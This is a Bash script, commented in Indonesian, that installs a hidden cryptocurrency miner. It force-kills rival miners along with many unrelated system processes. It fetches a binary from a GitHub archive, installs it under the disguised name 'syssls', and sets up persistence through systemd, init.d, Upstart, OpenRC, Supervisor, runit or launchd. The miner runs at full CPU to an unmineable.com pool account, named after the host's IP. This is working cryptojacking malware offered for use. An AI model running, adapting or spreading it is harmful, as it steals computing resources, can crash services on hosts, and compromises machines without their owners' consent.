#!/bin/bash

# Daftar nama proses miner yang ingin dibunuh
ps -ef | awk '/upgrade|update|xmrig|miner|ethminer|cpuminer|bminer|syssls|Ice-Unix|tailah|jancok|masscan|screen|cpu-miner|upx|minerd|dx|Font-unix|gelud|ICE-unix|kworker|perl|ld-linux-x86-64|node|power2b|sampah|Xorg|hellminer|git|gui/{print $2}' | xargs kill -9

echo "Semua proses miner yang ditemukan telah dibunuh."

# Pindah ke direktori /tmp
cd /tmp

# Mendapatkan nama sistem operasi
OS=$(uname)
hostnamets=$(uname -n)

if [[ ! -f "/tmp/syssls" ]]; then
    echo "File syssls tidak ditemukan, proses unduhan."
    if [[ "$OS" == "FreeBSD" ]]; then
        URL="https://github.com/shafafery/shafafery.github.io/raw/refs/heads/main/freebsd.tar.gz"
    else
        URL="https://github.com/shafafery/shafafery.github.io/raw/refs/heads/main/syssls.tar.gz"
    fi

    if command -v curl &> /dev/null; then
        curl -L "$URL" | tar zx
    elif command -v wget &> /dev/null; then
        wget -O - "$URL" | tar zx
    else
        echo "curl dan wget tidak tersedia. Tidak dapat mengunduh file."
        exit 1
    fi
fi

# Jika root, pindahkan syssls ke /usr/bin
if [ "$(id -u)" -eq 0 ]; then
    cp /tmp/syssls /usr/bin/syssls
    chmod +x /usr/bin/syssls
    EXEC_PATH="/usr/bin/syssls"
else
    EXEC_PATH="/tmp/syssls"
fi

# Mendapatkan alamat IP publik VPS
if command -v curl &> /dev/null; then
    IP_PUBLIC=$(curl -s http://ipecho.net/plain)
elif command -v wget &> /dev/null; then
    IP_PUBLIC=$(wget -qO- http://ipecho.net/plain)
else
    echo "curl dan wget tidak tersedia. Tidak dapat mengambil IP publik."
    exit 1
fi

# Mendapatkan alamat IP lokal VPS
IP_LOCAL=$(hostname -I | awk '{print $1}')

# Mengganti titik dengan hubung pada IP publik dan lokal
IP_PUBLIC_REPLACED=$(echo "$IP_PUBLIC" | sed 's/\./-/g')
IP_LOCAL_REPLACED=$(echo "$IP_LOCAL" | sed 's/\./-/g')
HOSTNAME_REPLACED=$(echo "$hostnamets" | sed 's/\./-/g')

# Menentukan apakah IP publik adalah IPv6
if [[ "$IP_PUBLIC" =~ : ]]; then
    IP_TO_USE=$IP_LOCAL_REPLACED
else
    IP_TO_USE=$IP_PUBLIC_REPLACED
fi

# Output hasil
echo "IP yang digunakan (dengan tanda hubung): $IP_TO_USE"

# Cek apakah systemctl tersedia
if [ "$(id -u)" -eq 0 ]; then
    if command -v systemctl >/dev/null 2>&1; then
        # Jika systemctl tersedia, buat dan aktifkan service systemd
        echo -e "[Unit]
Description=SYSSLS
After=network.target

[Service]
Type=simple
Restart=on-failure
RestartSec=15s
ExecStart=$EXEC_PATH -a rx -o stratum+ssl://rx.unmineable.com:443 -u 54477070.$IP_TO_USE --cpu-max-threads-hint=100

[Install]
WantedBy=multi-user.target" > /etc/systemd/system/syssls.service

        chmod 644 /etc/systemd/system/syssls.service
        systemctl daemon-reload
        systemctl enable syssls.service
        systemctl start syssls.service

        echo "Systemd service untuk SYSSLS telah dibuat, dimuat, dan dimulai."
        echo "Worker : VPS-$IP_TO_USE"
    elif [ -d "/etc/init.d" ]; then
        # SysVinit / init.d
        echo "Menggunakan SysVinit"
        echo -e "#!/bin/bash
### BEGIN INIT INFO
# Provides:          syssls
# Required-Start:    $network $local_fs $syslog
# Required-Stop:     $network $local_fs
# Default-Start:     2 3 4 5
# Default-Stop:      0 1 6
# Short-Description: Start syssls miner
### END INIT INFO

case \"\$1\" in
  start)
    echo \"Starting SYSSLS...\"
    $EXEC_PATH -a rx -o stratum+ssl://rx.unmineable.com:443 -u 54477070.$IP_TO_USE --cpu-max-threads-hint=100 &
    ;;
  stop)
    echo \"Stopping SYSSLS...\"
    pkill -f \"$EXEC_PATH\"
    ;;
  restart)
    echo \"Restarting SYSSLS...\"
    pkill -f \"$EXEC_PATH\"
    $EXEC_PATH -a rx -o stratum+ssl://rx.unmineable.com:443 -u 54477070.$IP_TO_USE --cpu-max-threads-hint=100 &
    ;;
  *)
    echo \"Usage: /etc/init.d/syssls {start|stop|restart}\"
    exit 1
    ;;
esac
exit 0" > /etc/init.d/syssls

        chmod +x /etc/init.d/syssls
        service syssls start

        echo "Layanan dimulai menggunakan SysVinit."
    elif command -v service >/dev/null 2>&1; then
        # Upstart
        echo "Menggunakan Upstart"
        echo -e "# /etc/init/syssls.conf
description \"SYSSLS Miner\"
start on (net-device-up
          and local-filesystems
          and runlevel [2345])
stop on runlevel [016]

respawn
exec /path/to/syssls -a rx -o stratum+ssl://rx.unmineable.com:443 -u 54477070.$IP_TO_USE --cpu-max-threads-hint=100" > /etc/init/syssls.conf

        start syssls

        echo "Layanan dimulai menggunakan Upstart."
    elif command -v openrc >/dev/null 2>&1; then
        # OpenRC
        echo "Menggunakan OpenRC"
        echo -e "#!/sbin/openrc-run

command=/path/to/syssls
command_args=\"-a rx -o stratum+ssl://rx.unmineable.com:443 -u 54477070.$IP_TO_USE --cpu-max-threads-hint=100\"
pidfile=/run/syssls.pid

depend() {
    need net
    use dns logger
}

start() {
    ebegin \"Starting syssls miner\"
    start-stop-daemon --start --background --make-pidfile --pidfile \$pidfile --exec \$command -- \$command_args
    eend \$?
}

stop() {
    ebegin \"Stopping syssls miner\"
    start-stop-daemon --stop --pidfile \$pidfile
    eend \$?
}" > /etc/init.d/syssls

        chmod +x /etc/init.d/syssls
        /etc/init.d/syssls start

        echo "Layanan dimulai menggunakan OpenRC."
    elif command -v supervisorctl >/dev/null 2>&1; then
        # Supervisor
        echo "Menggunakan Supervisor"
        echo -e "[program:syssls]
command=/path/to/syssls -a rx -o stratum+ssl://rx.unmineable.com:443 -u 54477070.$IP_TO_USE --cpu-max-threads-hint=100
autostart=true
autorestart=true
stderr_logfile=/var/log/syssls.err.log
stdout_logfile=/var/log/syssls.out.log" > /etc/supervisor/conf.d/syssls.conf

        supervisorctl reread
        supervisorctl update
        supervisorctl start syssls

        echo "Layanan dimulai menggunakan Supervisor."
    elif command -v runsv >/dev/null 2>&1; then
        # runit
        echo "Menggunakan runit"
        echo -e "#!/bin/sh
exec /path/to/syssls -a rx -o stratum+ssl://rx.unmineable.com:443 -u 54477070.$IP_TO_USE --cpu-max-threads-hint=100" > /etc/service/syssls/run

                chmod +x /etc/service/syssls/run
        sv start syssls

        echo "Layanan dimulai menggunakan runit."
    elif command -v launchctl >/dev/null 2>&1; then
        # launchd (macOS)
        echo "Menggunakan launchd"
        echo -e "<?xml version=\"1.0\" encoding=\"UTF-8\"?>
<plist version=\"1.0\">
  <dict>
    <key>Label</key>
    <string>com.syssls.miner</string>
    <key>ProgramArguments</key>
    <array>
      <string>/path/to/syssls</string>
      <string>-a</string>
      <string>rx</string>
      <string>-o</string>
      <string>stratum+ssl://rx.unmineable.com:443</string>
      <string>-u</string>
      <string>54477070.$IP_TO_USE</string>
      <string>--cpu-max-threads-hint=100</string>
    </array>
    <key>RunAtLoad</key>
    <true/>
    <key>KeepAlive</key>
    <true/>
  </dict>
</plist>" > /Library/LaunchDaemons/com.syssls.miner.plist

        sudo launchctl load /Library/LaunchDaemons/com.syssls.miner.plist
        sudo launchctl start com.syssls.miner

        echo "Layanan dimulai menggunakan launchd."
    else
        # Jika tidak menggunakan sistem init, jalankan dengan nohup di background
        nohup $EXEC_PATH -a rx -o stratum+ssl://rx.unmineable.com:443 -u 54477070.$HOSTNAME_REPLACED --cpu-max-threads-hint=100 > /tmp/.logacil 2>&1 &
        echo "Menjalankan miner sebagai user non-root di background dengan nohup."
        echo "Worker : $HOSTNAME_REPLACED"
    fi
else
    # Jika bukan root, bunuh proses miner sebelum menjalankan nohup di background
    nohup $EXEC_PATH -a rx -o stratum+ssl://rx.unmineable.com:443 -u 54477070.$HOSTNAME_REPLACED --cpu-max-threads-hint=100 > /tmp/.logacil 2>&1 &
    echo "Menjalankan miner sebagai user non-root di background dengan nohup."
    echo "Worker : $HOSTNAME_REPLACED"
fi
